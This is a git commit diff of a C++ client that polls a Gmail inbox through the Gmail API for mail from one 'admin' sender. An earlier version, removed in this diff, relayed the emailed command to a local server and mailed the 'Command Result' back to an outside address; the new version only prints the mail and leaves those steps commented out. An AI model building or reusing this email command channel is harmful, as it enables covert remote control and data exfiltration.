b2e406f68caca77430b8f0129459f1643d53a76d
JakeCoop <87562440+coopjake@users.noreply.github.com>
2024-11-05 20:59:57 +0700

    GmailAPI

--- client.cpp
+++ client.cpp
@@ -4,11 +4,9 @@
 #include <ws2tcpip.h>
 #include <cpr/cpr.h>
 #include <nlohmann/json.hpp>
-#include <sstream>
 #include <vector>
-#include <chrono>
 #include <thread>
-#include <unordered_set>
+#include <unordered_set> 
 
 #pragma comment(lib, "Ws2_32.lib")
 
@@ -54,11 +52,11 @@ std::string base64_decode(const std::string& input) {
 }
 
 std::string getAccessToken(const std::string& refreshToken, const std::string& clientId, const std::string& clientSecret) {
-    cpr::Response r = cpr::Post(cpr::Url{"https://oauth2.googleapis.com/token"},
-                                cpr::Payload{{"client_id", clientId},
-                                             {"client_secret", clientSecret},
-                                             {"refresh_token", refreshToken},
-                                             {"grant_type", "refresh_token"}});
+    cpr::Response r = cpr::Post(cpr::Url{ "https://oauth2.googleapis.com/token" },
+        cpr::Payload{ {"client_id", clientId},
+                     {"client_secret", clientSecret},
+                     {"refresh_token", refreshToken},
+                     {"grant_type", "refresh_token"} });
     if (r.status_code != 200) {
         std::cerr << "Failed to get access token: " << r.status_code << std::endl;
         return "";
@@ -72,64 +70,60 @@ void sendEmail(const std::string& accessToken, const std::string& to, const std:
     std::string email = "From: jakeva123kl@gmail.com\r\nTo: " + to + "\r\nSubject: " + subject + "\r\n\r\n" + body;
     std::string rawMessage = "{\"raw\": \"" + base64_encode(email) + "\"}";
 
-    cpr::Response r = cpr::Post(cpr::Url{"https://www.googleapis.com/gmail/v1/users/me/messages/send"},
-                                cpr::Header{{"Authorization", "Bearer " + accessToken},
-                                            {"Content-Type", "application/json"}},
-                                cpr::Body{rawMessage});
+    cpr::Response r = cpr::Post(cpr::Url{ "https://www.googleapis.com/gmail/v1/users/me/messages/send" },
+        cpr::Header{ {"Authorization", "Bearer " + accessToken},
+                    {"Content-Type", "application/json"} },
+        cpr::Body{ rawMessage });
     if (r.status_code != 200) {
         std::cerr << "Failed to send email: " << r.status_code << std::endl;
-    } else {
+    }
+    else {
         std::cout << "Email sent successfully" << std::endl;
     }
 }
 
 std::string getEmail(const std::string& accessToken, const std::string& messageId) {
-    cpr::Response r = cpr::Get(cpr::Url{"https://www.googleapis.com/gmail/v1/users/me/messages/" + messageId},
-                               cpr::Header{{"Authorization", "Bearer " + accessToken}});
+    cpr::Response r = cpr::Get(cpr::Url{ "https://www.googleapis.com/gmail/v1/users/me/messages/" + messageId },
+        cpr::Header{ {"Authorization", "Bearer " + accessToken} });
     if (r.status_code != 200) {
         std::cerr << "Failed to get email: " << r.status_code << std::endl;
         return "";
-    } else {
+    }
+    else {
         auto jsonData = json::parse(r.text);
         std::string encodedBody = jsonData["payload"]["parts"][0]["body"]["data"].get<std::string>();
         return base64_decode(encodedBody);
     }
 }
 
-std::string listEmails(const std::string& accessToken) {
-    cpr::Response r = cpr::Get(cpr::Url{"https://www.googleapis.com/gmail/v1/users/me/messages"},
-                               cpr::Header{{"Authorization", "Bearer " + accessToken}});
+std::string getMessageId(const std::string& accessToken) {
+    cpr::Response r = cpr::Get(cpr::Url{ "https://www.googleapis.com/gmail/v1/users/me/messages" },
+        cpr::Header{ {"Authorization", "Bearer " + accessToken} });
     if (r.status_code != 200) {
         std::cerr << "Failed to list emails: " << r.status_code << std::endl;
         return "";
-    } else {
-        return r.text;
+    }
+    else {
+        auto jsonData = json::parse(r.text);
+        std::string messageId = jsonData["messages"][0]["id"].get<std::string>();
+        return messageId;
     }
 }
 
-std::string findEmailFromSender(const std::string& accessToken, const std::string& senderEmail, std::unordered_set<std::string>& processedMessageIds) {
-    std::string emailList = listEmails(accessToken);
-    auto jsonData = json::parse(emailList);
+bool isAdmin(const std::string& accessToken, const std::string& senderEmail, const std::string& messageId) {
+    cpr::Response r = cpr::Get(cpr::Url{ "https://www.googleapis.com/gmail/v1/users/me/messages/" + messageId },
+        cpr::Header{ {"Authorization", "Bearer " + accessToken} });
 
-    for (const auto& message : jsonData["messages"]) {
-        std::string messageId = message["id"].get<std::string>();
-        if (processedMessageIds.find(messageId) != processedMessageIds.end()) {
-            continue; // Skip already processed emails
-        }
-
-        cpr::Response r = cpr::Get(cpr::Url{"https://www.googleapis.com/gmail/v1/users/me/messages/" + messageId},
-                                   cpr::Header{{"Authorization", "Bearer " + accessToken}});
-        if (r.status_code == 200) {
-            auto emailData = json::parse(r.text);
-            for (const auto& header : emailData["payload"]["headers"]) {
-                if (header["name"] == "From" && header["value"].get<std::string>().find(senderEmail) != std::string::npos) {
-                    processedMessageIds.insert(messageId); // Mark email as processed
-                    return messageId;
-                }
+    if (r.status_code == 200) {
+        auto emailData = json::parse(r.text);
+        for (const auto& header : emailData["payload"]["headers"]) {
+            if (header["name"] == "From" && header["value"].get<std::string>().find(senderEmail) != std::string::npos) {
+                return true;
             }
         }
     }
-    return "";
+
+    return false;
 }
 
 void send_request(const std::string& server, const std::string& request, std::string& response) {
@@ -141,34 +135,34 @@ int main() {
     std::string clientSecret = "";
     std::string refreshToken = "";
     std::string accessToken = getAccessToken(refreshToken, clientId, clientSecret);
+    std::string senderEmail = "";
 
     if (!accessToken.empty()) {
-        std::string senderEmail = "hieunguyen.jc@gmail.com";
         std::unordered_set<std::string> processedMessageIds;
+        std::string messageId = getMessageId(accessToken);
+        processedMessageIds.insert(messageId);
 
         while (true) {
-            std::string messageId = findEmailFromSender(accessToken, senderEmail, processedMessageIds);
+            
+            messageId = getMessageId(accessToken);
 
-            if (!messageId.empty()) {
+            if (processedMessageIds.find(messageId) == processedMessageIds.end() && isAdmin(accessToken, senderEmail, messageId)) {
                 std::string emailContent = getEmail(accessToken, messageId);
 
-                std::istringstream iss(emailContent);
-                std::string command, filename;
-                iss >> command >> filename;
+                std::cout << emailContent << std::endl;
 
-                std::string request = command + " " + filename;
-                std::string response;
-                send_request("127.0.0.1", request, response);
+                processedMessageIds.insert(messageId);
 
-                sendEmail(accessToken, "hieunguyen.jc@gmail.com", "Command Result", response);
-            } else {
-                std::cout << "No new email from " << senderEmail << std::endl;
+              
+                //std::string response;
+                //send_request("127.0.0.1", emailContent, response);
+
+                //sendEmail(accessToken, "hieunguyen.jc@gmail.com", "Command Result", response);*/
             }
-
-            std::this_thread::sleep_for(std::chrono::minutes(1)); // Delay checking mail
         }
-    } else {
-        std::cerr << "Failed to get access token" << std::endl;
+    }
+    else {
+        std::cerr << "Error" << std::endl;
     }
 
     return 0;
